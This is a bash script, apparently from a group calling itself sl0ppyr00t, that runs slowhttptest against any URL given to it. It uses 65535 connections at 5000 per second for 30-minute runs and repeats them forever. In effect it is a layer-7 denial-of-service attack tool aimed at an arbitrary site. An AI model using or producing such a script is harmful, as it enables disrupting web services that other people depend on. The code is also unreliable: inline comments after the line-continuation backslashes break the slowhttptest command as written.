#!/bin/bash
#   
# Enhanced Sl0ppy - l7-header
# Team sl0ppyr00t
# x0xr00t

# Validate URL input
if [[ -z "$1" ]]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

url="$1"

# Function to run slowhttptest with optimized parameters
function run_slowhttptest {
    echo "[*] Starting slowhttptest against $url with optimized parameters..."
    slowhttptest \
        -X -u "$url" \
        -c 65535 \ # Concurrent connections
        -r 5000 \  # Connections per second
        -t HEAD \  # HTTP method (Header test)
        -l 1800 \  # Duration in seconds (30 minutes)
        -i 10 \    # Interval before reconnecting
        -g \
        --no-progress-bar
}

# Infinite loop to continue tests
while true; do
    run_slowhttptest
    echo "[*] Test iteration completed. Restarting in 5 seconds..."
    sleep 5
done
